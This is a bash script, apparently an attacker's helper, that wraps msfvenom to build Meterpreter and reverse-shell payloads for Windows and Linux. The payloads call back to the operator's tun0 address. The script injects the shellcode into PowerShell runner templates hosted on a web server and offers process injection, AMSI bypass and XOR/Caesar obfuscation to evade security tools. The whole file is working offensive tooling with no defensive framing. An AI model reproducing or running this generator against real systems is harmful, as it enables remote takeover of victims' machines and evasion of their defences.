#!/bin/bash

name=`basename $0`
iface="tun0"
port="443"
payload=("windows/x64/meterpreter/reverse_https" "linux/x64/meterpreter/reverse_tcp" "linux/x64/shell/reverse_tcp" "windows/meterpreter/reverse_https" "linux/meterpreter/reverse_tcp" "linux/shell/reverse_tcp")
others=""
iself=0
bit=0
IP=""
nstaged=0
os="win"
met=1
encrypt=0
procname=""
data=""
incamsi=""
amsibp=""
updatefile=""
tmptoupdate="/tmp/outupdate.txt"

usage() {
	echo "Arguments: "
	echo "--port     | -p ... port (default 443)"
	echo "--elf      | -e ... want output es elf"
	echo "--os       | -o ... lin / win"
	echo "--bit32    | -b ... 32bit shell"
	echo "--data     | -d ... additional payload for the powershell"
	echo "--nostaged | -n ... non staged payload"
	echo "--iface    | -i ... interface"
	echo "--extra    | -x ... extra args for venom (-f c)"
	echo "--enc      | -c ... encrypt with xor + cezar"
	echo "--procname |    ... process name for powershell + process injection"
	echo "--incamsi  | -a ... powershell specific @ include asmi bypass file as iex"
	echo "--amsibp   |    ... powershell specific @ include amsi bypass code before IEX"
	echo "--update   | -u ... update shell in source code / csharp / c++ for now; Path to the source is mandatory!"
	echo "--help     | -h ... this help"
	echo "----------- HELPER SHORTCUTS --------"
	echo "genlindef   ... linux staged meterpreter (c shell default)"
	echo "genlinrev   ... linux nonstaged meterpreter (c shell default)"
	echo "genwindef   ... windows staged meterpreter (csharp default)"
	echo "genpsshell  ... windows powershell directly used in template psrun"
	echo "gencsharpsh ... windows csharp shell"
	exit 0
}

opt=$(getopt -l "amsibp,incamsi,enc,help,elf,os:,bit32,iface:,extra:,port:,nostaged,data:,procname:,update:" -a -o ":ahbeni:x:o:p:d:u:" -- "$@")
eval set -- "$opt"


while true;do
        case $1 in
		--update|-u)
			shift
			updatefile=$1
			if [ ! -s $updatefile ];then
				echo "[!] Update file NOT found, exitting!"
				exit -1
			fi
			;;
		--amsibp)
			amsibp="--amsibp"
			;;
		--incamsi|-a)
			incamsi="--incamsi"
			;;
		--port|-p)
			shift
			port=$1
			if ! [ "$port" -eq "$port" ] 2>/dev/null;then
				echo "Bad port"
				exit 0
			fi
			if [ $port -gt 65535 ]||[ $port -lt 1 ];then
				echo "Bad port"
				exit 0
			fi
			;;
		--data|-d)
			shift
			data="--data $1"
			;;
		--procname)
			shift
			procname=$1
			;;
		--enc|-e)
			encrypt=1
			;;
                --elf)
			iself=1
                        ;;
                --os|-o)
			shift
			os=$1			
                        ;;
                --bit32|-b)
			bit=1
                        ;;
		--nostaged|-n)
			nstaged=1
			;;
		--iface|-i)
			shift
			iface=$1
                        ;;
		--extra|-x)
			shift
			others="$1"
                        ;;
		--help|-h)
			usage
			exit 0
			;;
		--)
			shift
			break;
			;;
        esac
	shift
done

getsh() {
	nstaged=$1 
	os=$2
	if [ "$os" == "lin" ];then
		if [ $nstaged -eq 0 ];then
			return 1
		else
			return 2
		fi
	elif [ "$os" == "win" ];then
		return 0
	fi
}

dmpsh() {
	for s in ${payload[@]};do
		echo "[i] $s"
	done
}


echo "name: $name / met: $met / iself: $iself / os: $os / bit32: $bit / nostaged: $nstaged | iface: $iface | extra: $others / encrypt: $encrypt / port: $port / procname: $procname / update: $updatefile"

offset=0
if [ "$bit" -eq 1 ];then
	offset=3
fi


what=$(echo $others | grep -oe "\(csharp\)\|\(ps1\)\|\(c[ ]\?\)" | tr -d " ")
echo "WHAT: $what"
case $name in
	genlindef)
		os="lin"
		if [ "$what" == "" ];then
			others="$others -f c"
		fi
		;;
	genlinrev)
		os="lin"
		if [ "$what" == "" ];then
			others="$others -f c"
		fi
		;;
	genpsshell)
		os="win"
		others="$others -f ps1"
		;;
	gencsharpsh)
		os="win"
		others="$others -f csharp"
		;;
	genwindef)
		if [ "$what" == "" ];then
			others="$others -f csharp"
		fi
		os="win"
		;;
esac


getsh $nstaged $os
id=$?
id=$((id + offset))
RUNNER=${payload[$id]}

testi=$(ip l | grep -io $iface)
if [ x"$testi" == x"" ];then
	echo "[!] Adapter $iface not found!"
	echo "Valid interfaces:"
	ip -p -j l | jq -r 'map(.ifname)'
	exit 1
fi

IP=$(ip -4 -p -j a s $iface | jq -r '.[0].addr_info[0].local')

echo "[i] Generating payload for host $IP, port $port, payload $RUNNER"
echo "[i] Others: $others"
echo "[i] Encrypt: $encrypt"
echo ""

if [ "$iself" -eq 1 ];then
	msfvenom -p $RUNNER LHOST=$IP LPORT=$port $others -o /tmp/sh.elf
else
	msfvenom -p $RUNNER LHOST=$IP LPORT=$port -o /tmp/shell.txt $others && cat /tmp/shell.txt | xclip -selection clipboard
	echo "[i] Shellcode stored do clipboardu, shell file /tmp/shell.txt"
fi
SHFILE=""
if [ "$name" == "genpsshell" ];then
	TPLPATH="/var/www/html/shells/"
	LOCTEMPLATE="${TPLPATH}psrun.txt"
	INJTEMPLATE="${TPLPATH}psruninj.txt"
	if [ -z "$procname" ];then
		TEMPLATE=$LOCTEMPLATE
	else
		TEMPLATE=$INJTEMPLATE
	fi
	NEWF="${TPLPATH}sh$(date +%s).txt"
	echo -e "\e[31m[i] Using template: $TEMPLATE\e[0m"
	cp $TEMPLATE $NEWF
	sed -i 's/{SHELLTOREPLACE}/'"$(xclip -o -selection clipboard)"'/' $NEWF
	if [ ! -z "$procname" ];then 
		sed -i 's/{TARGETPROCESS}/'"${procname}"'/' $NEWF
	fi
	getiex --iface $iface --file ${NEWF##*/} -p --twoiter "$data" $amsibp $incamsi
fi

what=$(echo $others | grep -oe "\(csharp\)\|\(ps1\)\|\(c[ ]\?\)")
if [ "$encrypt" -eq 1 ];then
	klic=$(date +%T | tr ":" "_")
	rot=$(python3 -c 'import random;print(random.randint(3,14))' | tr -d "\n")
	echo "[i] What: $what / Klic: $klic / rot: $rot / updatefile: $updatefile"
	if [ -z "$updatefile" ];then
		tmptoupdate=""
	fi
	encrypt_shell /tmp/shell.txt $what $klic $rot $tmptoupdate
	replace.py $tmptoupdate $updatefile
fi


